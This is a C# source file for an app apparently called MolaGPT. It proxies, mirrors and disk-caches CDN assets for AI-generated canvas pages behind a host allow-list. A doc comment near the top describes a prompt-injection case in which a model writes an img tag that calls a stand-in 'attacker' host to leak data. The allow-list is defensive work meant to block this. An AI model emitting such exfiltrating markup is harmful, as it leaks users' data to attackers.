using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using MolaGPT.Core.Net;

namespace MolaGPT.App.Rendering.Canvas;

internal sealed record CdnResponse(byte[] Body, string ContentType);

/// <summary>
/// Fetches what canvas pages load from CDNs, on the page's behalf.
///
/// Three reasons it goes through us rather than straight from the browser:
///  - Reach. jsDelivr and unpkg are slow-to-unusable from mainland China
///    (measured: a 1 MB echarts build did not finish in 12 s from jsDelivr,
///    0.5 s from npmmirror). Each request races the original against mirrors
///    that serve the same package paths, and the first complete body wins —
///    so users elsewhere lose nothing and users in China get the mirror.
///  - Memory. Every successful body is kept on disk, so a page generated last
///    week still renders offline.
///  - One gate. The allow-list lives here and in the CSP, nowhere else.
///
/// Mirrors are chosen for being run by large, accountable operators. BootCDN
/// and Staticfile are deliberately absent: they were named in the 2024
/// polyfill.io supply-chain incident.
/// </summary>
internal static class CdnProxy
{
    /// <summary>Hosts a canvas page may load from. Anything else is refused,
    /// images included — a model tricked by injected text into writing
    /// <c>&lt;img src="https://attacker/?q=…"&gt;</c> must not get to send it.</summary>
    public static readonly string[] AllowedHosts =
    [
        "cdn.jsdelivr.net", "fastly.jsdelivr.net", "gcore.jsdelivr.net",
        "unpkg.com", "cdnjs.cloudflare.com", "esm.sh", "cdn.tailwindcss.com",
        "registry.npmmirror.com", "cdn.npmmirror.com", "lib.baomitu.com",
        "fonts.googleapis.com", "fonts.gstatic.com",
    ];

    private const int MaxBody = 24 * 1024 * 1024;
    private const long CacheBudget = 256L * 1024 * 1024;

    private static readonly SocketsHttpHandler Handler = new()
    {
        AutomaticDecompression = DecompressionMethods.All,
        AllowAutoRedirect = false,
        ConnectTimeout = TimeSpan.FromSeconds(8),
        PooledConnectionLifetime = TimeSpan.FromMinutes(5),
    };
    private static readonly HttpClient Http = CreateClient();
    private static readonly Lock CacheGate = new();

    public static string CacheDirectory { get; } = Path.Combine(CanvasEnvironment.Root, "cdn-cache");

    public static IReadOnlyList<string> ListCachePaths()
    {
        if (!Directory.Exists(CacheDirectory)) return [];
        return Directory.EnumerateFiles(CacheDirectory)
            .Where(path => System.Text.RegularExpressions.Regex.IsMatch(Path.GetFileName(path),
                @"^[0-9a-f]{32}\.(entry|bin|type)$", System.Text.RegularExpressions.RegexOptions.IgnoreCase))
            .ToArray();
    }

    public static void ConfigureProxy(IWebProxy proxy) => Handler.Proxy = proxy;

    public static bool IsAllowed(Uri uri) => uri.IsAbsoluteUri && uri.Scheme == Uri.UriSchemeHttps
        && uri.IsDefaultPort && AllowedHosts.Contains(uri.IdnHost, StringComparer.OrdinalIgnoreCase);

    public static async Task<CdnResponse?> FetchAsync(Uri uri, CancellationToken ct)
    {
        ct.ThrowIfCancellationRequested();
        if (!IsAllowed(uri)) return null;
        var key = Hash("v2:" + uri.AbsoluteUri);
        if (await Task.Run(() => ReadCache(key), ct).ConfigureAwait(false) is { } cached) return cached;

        var candidates = Candidates(uri).ToList();
        using var race = CancellationTokenSource.CreateLinkedTokenSource(ct);
        race.CancelAfter(TimeSpan.FromSeconds(40));
        var pending = candidates.Select(candidate => FetchOneAsync(Http, candidate, race.Token)).ToList();

        while (pending.Count > 0)
        {
            var finished = await Task.WhenAny(pending).ConfigureAwait(false);
            pending.Remove(finished);
            if (await finished.ConfigureAwait(false) is not { } response) continue;

            await race.CancelAsync().ConfigureAwait(false);
            ct.ThrowIfCancellationRequested();
            WriteCache(key, response);
            return response;
        }

        ct.ThrowIfCancellationRequested();
        return null;
    }

    /// <summary>The original first, then mirrors that serve the same file under
    /// a different path scheme. Only unambiguous mappings: a bare package URL
    /// (no file path) resolves to different entry files on different CDNs, so
    /// it is not mirrored.</summary>
    private static IEnumerable<Uri> Candidates(Uri uri)
    {
        yield return uri;

        var host = uri.Host.ToLowerInvariant();
        var path = uri.AbsolutePath;

        if (host is "cdn.jsdelivr.net" or "fastly.jsdelivr.net" or "gcore.jsdelivr.net"
            && path.StartsWith("/npm/", StringComparison.Ordinal)
            && SplitPackage(path["/npm/".Length..]) is { } npm)
        {
            yield return new Uri($"https://registry.npmmirror.com/{npm.Name}/{npm.Version}/files/{npm.File}{uri.Query}");
            yield return new Uri($"https://unpkg.com/{npm.Name}@{npm.Version}/{npm.File}{uri.Query}");
        }
        else if (host is "cdn.jsdelivr.net" or "fastly.jsdelivr.net" or "gcore.jsdelivr.net"
                 && path.StartsWith("/npm/", StringComparison.Ordinal)
                 && !path.Contains('+'))
        {
            // Bare package URL: unpkg picks the browser build the same way
            // jsDelivr does for nearly every library a page would load.
            yield return new Uri("https://unpkg.com/" + path["/npm/".Length..] + uri.Query);
        }
        else if (host == "unpkg.com" && SplitPackage(path.TrimStart('/')) is { } pkg)
        {
            yield return new Uri($"https://registry.npmmirror.com/{pkg.Name}/{pkg.Version}/files/{pkg.File}");
            yield return new Uri($"https://cdn.jsdelivr.net/npm/{pkg.Name}@{pkg.Version}/{pkg.File}");
        }
        else if (host == "cdnjs.cloudflare.com" && path.StartsWith("/ajax/libs/", StringComparison.Ordinal))
        {
            yield return new Uri("https://lib.baomitu.com/" + path["/ajax/libs/".Length..] + uri.Query);
        }
    }

    /// <summary>"echarts@5.5.1/dist/echarts.min.js" or "@antv/g2@5/dist/g2.min.js"
    /// → (name, version, file). Null when there is no file part or the path
    /// uses a jsDelivr-only feature (+esm, directory listings).</summary>
    private static (string Name, string Version, string File)? SplitPackage(string spec)
    {
        var segments = spec.Split('/');
        var nameSegments = spec.StartsWith('@') ? 2 : 1;
        if (segments.Length <= nameSegments) return null;

        var head = string.Join('/', segments.Take(nameSegments));
        var file = string.Join('/', segments.Skip(nameSegments));
        if (file.Length == 0 || file.Contains('+') || file.EndsWith('/')) return null;

        var at = head.LastIndexOf('@');
        var (name, version) = at > 0 ? (head[..at], head[(at + 1)..]) : (head, "latest");
        if (version.Length == 0) version = "latest";
        return (name, version, file);
    }

    private static async Task<CdnResponse?> FetchOneAsync(HttpClient http, Uri uri, CancellationToken ct)
    {
        try
        {
            for (var hops = 0; hops <= 5 && IsAllowed(uri); hops++)
            {
                using var response = await http.GetAsync(uri, HttpCompletionOption.ResponseHeadersRead, ct).ConfigureAwait(false);
                if ((int)response.StatusCode is 301 or 302 or 303 or 307 or 308)
                {
                    if (response.Headers.Location is not { } location || !Uri.TryCreate(uri, location, out var next)) return null;
                    uri = next;
                    continue;
                }
                if (response.StatusCode != HttpStatusCode.OK || response.Content.Headers.ContentLength > MaxBody) return null;
                using var stream = await response.Content.ReadAsStreamAsync(ct).ConfigureAwait(false);
                var body = await BoundedRead.ReadAsync(stream, MaxBody, ct).ConfigureAwait(false);
                return new CdnResponse(body, response.Content.Headers.ContentType?.ToString() ?? GuessType(uri.AbsolutePath));
            }
            return null;
        }
        catch (Exception ex) when (ex is HttpRequestException or OperationCanceledException or IOException or InvalidDataException)
        {
            return null;
        }
    }

    private static string GuessType(string path) => Path.GetExtension(path).ToLowerInvariant() switch
    {
        ".js" or ".mjs" or ".cjs" => "application/javascript; charset=utf-8",
        ".css" => "text/css; charset=utf-8",
        ".json" => "application/json; charset=utf-8",
        ".wasm" => "application/wasm",
        ".svg" => "image/svg+xml",
        ".woff2" => "font/woff2",
        ".woff" => "font/woff",
        ".ttf" => "font/ttf",
        ".png" => "image/png",
        _ => "application/octet-stream",
    };

    // ---- disk cache --------------------------------------------------------------

    private static CdnResponse? ReadCache(string key)
    {
        try
        {
            var path = Path.Combine(CacheDirectory, key + ".entry");
            lock (CacheGate)
            {
                if (!File.Exists(path)) return null;
                using var file = File.OpenRead(path);
                using var reader = new BinaryReader(file);
                var typeLength = reader.ReadInt32();
                var length = file.Length - sizeof(int) - typeLength;
                if (typeLength is < 1 or > 4096 || length is < 0 or > MaxBody) return null;
                var type = Encoding.UTF8.GetString(reader.ReadBytes(typeLength));
                var body = reader.ReadBytes((int)length);
                file.Close();
                File.SetLastAccessTimeUtc(path, DateTime.UtcNow);
                return new CdnResponse(body, type);
            }
        }
        catch (IOException)
        {
            return null;
        }
        catch (UnauthorizedAccessException)
        {
            return null;
        }
    }

    private static void WriteCache(string key, CdnResponse response)
    {
        var path = Path.Combine(CacheDirectory, key + ".entry");
        var temp = path + "." + Guid.NewGuid().ToString("N") + ".tmp";
        try
        {
            var type = Encoding.UTF8.GetBytes(response.ContentType);
            if (type.Length is < 1 or > 4096) return;
            Directory.CreateDirectory(CacheDirectory);
            using (var writer = new BinaryWriter(File.Create(temp)))
            {
                writer.Write(type.Length);
                writer.Write(type);
                writer.Write(response.Body);
            }
            lock (CacheGate)
            {
                File.Move(temp, path, overwrite: true);
                Trim();
            }
        }
        catch (IOException)
        {
        }
        catch (UnauthorizedAccessException)
        {
        }
        finally
        {
            try { File.Delete(temp); }
            catch (IOException) { }
            catch (UnauthorizedAccessException) { }
        }
    }

    /// <summary>Evict cold entries, including files from the previous two-file format.</summary>
    private static void Trim()
    {
        try
        {
            var files = ListCachePaths().Select(path => new FileInfo(path)).OrderBy(f => f.LastAccessTimeUtc).ToList();
            long total = files.Sum(file => file.Length);
            foreach (var file in files)
            {
                if (total <= CacheBudget) break;
                total -= file.Length;
                file.Delete();
            }
        }
        catch (IOException)
        {
        }
        catch (UnauthorizedAccessException)
        {
        }
    }

    private static string Hash(string value) =>
        Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(value)))[..32].ToLowerInvariant();

    private static HttpClient CreateClient()
    {
        var client = new HttpClient(Handler) { Timeout = TimeSpan.FromSeconds(40) };
        client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) MolaGPT-Canvas/1.0");
        return client;
    }
}
